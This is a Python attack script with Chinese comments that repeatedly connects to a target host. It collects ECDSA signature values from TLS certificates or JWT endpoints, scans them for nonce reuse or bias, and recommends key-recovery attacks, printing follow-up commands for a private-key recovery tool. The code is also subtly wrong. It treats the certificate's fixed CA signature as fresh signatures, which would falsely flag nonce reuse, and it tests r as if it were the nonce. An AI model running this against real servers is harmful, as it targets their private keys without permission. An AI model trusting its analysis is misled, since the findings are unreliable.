#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
ECDSA Nonce Leakage Collector
收集ECDSA签名并分析nonce泄露模式
"""

import time
import ssl
import socket
import hashlib
import asyncio
import struct
from typing import List, Tuple, Dict, Optional
from dataclasses import dataclass
import json

@dataclass
class ECDSASignature:
    r: int
    s: int
    hash: bytes
    timestamp: float
    response_time: float
    raw_data: bytes = b""

class ECDSANonceCollector:
    def __init__(self, target_host: str, target_port: int = 443):
        self.target_host = target_host
        self.target_port = target_port
        self.signatures: List[ECDSASignature] = []
        self.timing_data: List[float] = []
        
    def extract_ecdsa_from_tls(self, cert_der: bytes) -> Optional[Tuple[int, int]]:
        """从TLS证书中提取ECDSA签名值(r, s)"""
        try:
            # 简化的DER解析 - 寻找ECDSA签名
            # ECDSA-Sig-Value ::= SEQUENCE { r INTEGER, s INTEGER }
            
            # 查找SEQUENCE标记 (0x30)
            idx = 0
            while idx < len(cert_der) - 4:
                if cert_der[idx] == 0x30:  # SEQUENCE
                    length = cert_der[idx + 1]
                    if length < 0x80:  # 短形式长度
                        seq_data = cert_der[idx+2:idx+2+length]
                        # 尝试解析r和s
                        if len(seq_data) > 8 and seq_data[0] == 0x02:  # INTEGER
                            r_len = seq_data[1]
                            r_bytes = seq_data[2:2+r_len]
                            
                            s_idx = 2 + r_len
                            if s_idx < len(seq_data) and seq_data[s_idx] == 0x02:  # INTEGER
                                s_len = seq_data[s_idx+1]
                                s_bytes = seq_data[s_idx+2:s_idx+2+s_len]
                                
                                r = int.from_bytes(r_bytes, 'big')
                                s = int.from_bytes(s_bytes, 'big')
                                
                                # 检查是否是合理的ECDSA签名值
                                if 100 < r.bit_length() < 600 and 100 < s.bit_length() < 600:
                                    return (r, s)
                idx += 1
        except Exception as e:
            print(f"[-] Error parsing ECDSA signature: {e}")
        return None

    def collect_tls_handshake_signature(self, sni: Optional[str] = None) -> Optional[ECDSASignature]:
        """通过TLS握手收集ECDSA签名"""
        try:
            # 创建socket
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(10)
            
            # 测量时间
            start_time = time.perf_counter()
            
            # 连接
            sock.connect((self.target_host, self.target_port))
            
            # SSL包装
            context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE
            
            # 强制使用ECDSA套件
            try:
                context.set_ciphers('ECDSA:!RSA:!DSS')
            except:
                pass
            
            ssock = context.wrap_socket(sock, server_hostname=sni or self.target_host)
            
            # 获取证书
            cert_der = ssock.getpeercert_bin()
            response_time = time.perf_counter() - start_time
            
            # 提取ECDSA签名
            sig = self.extract_ecdsa_from_tls(cert_der)
            
            if sig:
                r, s = sig
                # 计算证书哈希（简化）
                cert_hash = hashlib.sha256(cert_der).digest()
                
                ecdsa_sig = ECDSASignature(
                    r=r,
                    s=s,
                    hash=cert_hash,
                    timestamp=time.time(),
                    response_time=response_time,
                    raw_data=cert_der[:100]  # 保存部分原始数据
                )
                
                ssock.close()
                sock.close()
                return ecdsa_sig
                
            ssock.close()
            sock.close()
            
        except Exception as e:
            print(f"[-] TLS collection error: {e}")
        
        return None

    async def collect_jwt_signature(self, api_endpoint: str) -> Optional[ECDSASignature]:
        """从JWT/API收集ECDSA签名"""
        import aiohttp
        import base64
        
        try:
            async with aiohttp.ClientSession() as session:
                start_time = time.perf_counter()
                
                # 请求API获取JWT token
                async with session.post(
                    f"https://{self.target_host}{api_endpoint}",
                    json={"timestamp": time.time()},  # 变化的数据产生不同签名
                    ssl=False,
                    timeout=aiohttp.ClientTimeout(total=10)
                ) as resp:
                    response_time = time.perf_counter() - start_time
                    
                    # 从响应中提取JWT
                    data = await resp.text()
                    
                    # 简单的JWT解析（假设是标准格式）
                    if '.' in data:
                        parts = data.split('.')
                        if len(parts) == 3:
                            # 解码签名部分
                            sig_b64 = parts[2]
                            sig_bytes = base64.urlsafe_b64decode(sig_b64 + '==')
                            
                            # 提取r和s (假设是P-256, 各32字节)
                            if len(sig_bytes) >= 64:
                                r = int.from_bytes(sig_bytes[:32], 'big')
                                s = int.from_bytes(sig_bytes[32:64], 'big')
                                
                                # 计算消息哈希
                                message = f"{parts[0]}.{parts[1]}".encode()
                                msg_hash = hashlib.sha256(message).digest()
                                
                                return ECDSASignature(
                                    r=r,
                                    s=s,
                                    hash=msg_hash,
                                    timestamp=time.time(),
                                    response_time=response_time
                                )
        except Exception as e:
            print(f"[-] JWT collection error: {e}")
        
        return None

    def analyze_timing_correlation(self) -> Dict:
        """分析时序与nonce泄露的关联"""
        if len(self.signatures) < 2:
            return {}
        
        # 按响应时间排序
        sorted_sigs = sorted(self.signatures, key=lambda x: x.response_time)
        
        # 分析最快和最慢的签名
        fast_sigs = sorted_sigs[:len(sorted_sigs)//4]
        slow_sigs = sorted_sigs[3*len(sorted_sigs)//4:]
        
        # 检查r值的MSB
        fast_msb_zeros = 0
        slow_msb_zeros = 0
        
        for sig in fast_sigs:
            # 检查最高有效位
            if sig.r < (2**255):  # MSB是0
                fast_msb_zeros += 1
                
        for sig in slow_sigs:
            if sig.r < (2**255):
                slow_msb_zeros += 1
        
        return {
            "fast_response_msb_zero_rate": fast_msb_zeros / len(fast_sigs) if fast_sigs else 0,
            "slow_response_msb_zero_rate": slow_msb_zeros / len(slow_sigs) if slow_sigs else 0,
            "timing_correlation": abs((fast_msb_zeros/len(fast_sigs)) - (slow_msb_zeros/len(slow_sigs))) if fast_sigs and slow_sigs else 0
        }

    def detect_nonce_reuse(self) -> List[Tuple[ECDSASignature, ECDSASignature]]:
        """检测nonce重用"""
        r_map = {}
        reused = []
        
        for sig in self.signatures:
            if sig.r in r_map:
                # 发现重用！
                reused.append((r_map[sig.r], sig))
                print(f"[!!!] NONCE REUSE DETECTED! r = {hex(sig.r)[:16]}...")
            else:
                r_map[sig.r] = sig
        
        return reused

    def estimate_nonce_bias(self) -> Dict:
        """估算nonce偏差"""
        if not self.signatures:
            return {}
        
        msb_zeros = 0
        lsb_zeros = 0
        small_nonces = 0  # k < n/4
        
        # 假设是P-256曲线
        n = 0xFFFFFFFF00000000FFFFFFFFFFFFFFFFBCE6FAADA7179E84F3B9CAC2FC632551
        
        for sig in self.signatures:
            # 检查MSB
            if sig.r < (n // 2):
                msb_zeros += 1
            
            # 检查是否异常小
            if sig.r < (n // 4):
                small_nonces += 1
            
            # 检查LSB
            if sig.r & 0xFF == 0:
                lsb_zeros += 1
        
        total = len(self.signatures)
        
        return {
            "total_signatures": total,
            "msb_zero_rate": msb_zeros / total,
            "small_nonce_rate": small_nonces / total,
            "lsb_zero_rate": lsb_zeros / total,
            "expected_random": 0.5,  # 随机情况下应该是50%
            "msb_bias_detected": abs(msb_zeros/total - 0.5) > 0.1,
            "likely_vulnerable": (msb_zeros/total > 0.7) or (small_nonces/total > 0.3)
        }

    async def collect_batch(self, count: int = 100, method: str = "tls") -> None:
        """批量收集签名"""
        print(f"[*] Starting collection of {count} signatures via {method}")
        print(f"[*] Target: {self.target_host}:{self.target_port}")
        
        start_time = time.time()
        
        for i in range(count):
            sig = None
            
            if method == "tls":
                # TLS证书签名收集
                sig = self.collect_tls_handshake_signature()
                
            elif method == "jwt":
                # JWT签名收集（需要知道API端点）
                sig = await self.collect_jwt_signature("/api/auth/token")
            
            if sig:
                self.signatures.append(sig)
                
                # 实时分析
                if len(self.signatures) % 10 == 0:
                    bias = self.estimate_nonce_bias()
                    print(f"[+] Collected {len(self.signatures)} signatures")
                    print(f"    MSB=0 rate: {bias['msb_zero_rate']:.2%}")
                    print(f"    Small nonce rate: {bias['small_nonce_rate']:.2%}")
                    
                    # 检查nonce重用
                    reused = self.detect_nonce_reuse()
                    if reused:
                        print(f"[!!!] Found {len(reused)} nonce reuses! Private key recovery possible!")
                        break
            
            # 避免过于频繁
            await asyncio.sleep(0.1)
        
        elapsed = time.time() - start_time
        print(f"\n[*] Collection completed in {elapsed:.1f} seconds")
        
    def generate_report(self) -> Dict:
        """生成分析报告"""
        bias = self.estimate_nonce_bias()
        timing = self.analyze_timing_correlation()
        reused = self.detect_nonce_reuse()
        
        report = {
            "summary": {
                "target": f"{self.target_host}:{self.target_port}",
                "total_signatures": len(self.signatures),
                "unique_r_values": len(set(sig.r for sig in self.signatures)),
                "nonce_reuses_found": len(reused),
                "collection_time": max(sig.timestamp for sig in self.signatures) - min(sig.timestamp for sig in self.signatures) if self.signatures else 0
            },
            "bias_analysis": bias,
            "timing_correlation": timing,
            "vulnerability_assessment": {
                "nonce_reuse_vulnerable": len(reused) > 0,
                "timing_leak_suspected": timing.get("timing_correlation", 0) > 0.2,
                "nonce_bias_detected": bias.get("likely_vulnerable", False),
                "recommended_attack": self._recommend_attack(bias, timing, reused)
            }
        }
        
        # 如果发现漏洞，输出可利用的数据
        if report["vulnerability_assessment"]["nonce_reuse_vulnerable"]:
            report["exploit_data"] = {
                "reused_signatures": [
                    {
                        "sig1": {"r": hex(s1.r), "s": hex(s1.s), "h": s1.hash.hex()},
                        "sig2": {"r": hex(s2.r), "s": hex(s2.s), "h": s2.hash.hex()}
                    }
                    for s1, s2 in reused
                ]
            }
        
        return report
    
    def _recommend_attack(self, bias: Dict, timing: Dict, reused: List) -> str:
        """推荐最适合的攻击方法"""
        if reused:
            return "IMMEDIATE: Nonce reuse attack - private key recovery possible NOW"
        elif bias.get("msb_zero_rate", 0) > 0.7:
            return "Lattice attack with MSB bias - collect 200+ signatures"
        elif bias.get("small_nonce_rate", 0) > 0.3:
            return "Hidden Number Problem - nonces are biased small"
        elif timing.get("timing_correlation", 0) > 0.2:
            return "Timing-based side channel - collect 1000+ signatures with timing"
        else:
            return "No obvious vulnerability detected - may need more samples or different approach"

async def main():
    """主函数 - 快速收集100个签名并分析"""
    import sys
    
    # 从命令行获取目标
    if len(sys.argv) < 2:
        print("Usage: python ecdsa_nonce_collector.py <target_host> [port]")
        print("Example: python ecdsa_nonce_collector.py example.com 443")
        sys.exit(1)
    
    target_host = sys.argv[1]
    target_port = int(sys.argv[2]) if len(sys.argv) > 2 else 443
    
    # 创建收集器
    collector = ECDSANonceCollector(target_host, target_port)
    
    # 收集100个签名
    await collector.collect_batch(count=100, method="tls")
    
    # 生成报告
    report = collector.generate_report()
    
    # 输出结果
    print("\n" + "="*60)
    print("ECDSA NONCE ANALYSIS REPORT")
    print("="*60)
    print(json.dumps(report, indent=2))
    
    # 保存详细数据供后续分析
    with open(f"ecdsa_sigs_{target_host}_{int(time.time())}.json", "w") as f:
        detailed_data = {
            "report": report,
            "signatures": [
                {
                    "r": hex(sig.r),
                    "s": hex(sig.s),
                    "hash": sig.hash.hex(),
                    "response_time": sig.response_time,
                    "timestamp": sig.timestamp
                }
                for sig in collector.signatures
            ]
        }
        json.dump(detailed_data, f, indent=2)
        print(f"\n[+] Detailed data saved to {f.name}")
    
    # 如果发现漏洞，给出具体利用建议
    if report["vulnerability_assessment"]["nonce_reuse_vulnerable"]:
        print("\n[!!!] CRITICAL: Nonce reuse detected! Run the following to recover private key:")
        print("python ecdsa_private_key_recovery.py --input", f.name)
    elif report["vulnerability_assessment"]["nonce_bias_detected"]:
        print("\n[!] Nonce bias detected. Collect more signatures for lattice attack:")
        print(f"python ecdsa_nonce_collector.py {target_host} --count 500")

if __name__ == "__main__":
    asyncio.run(main())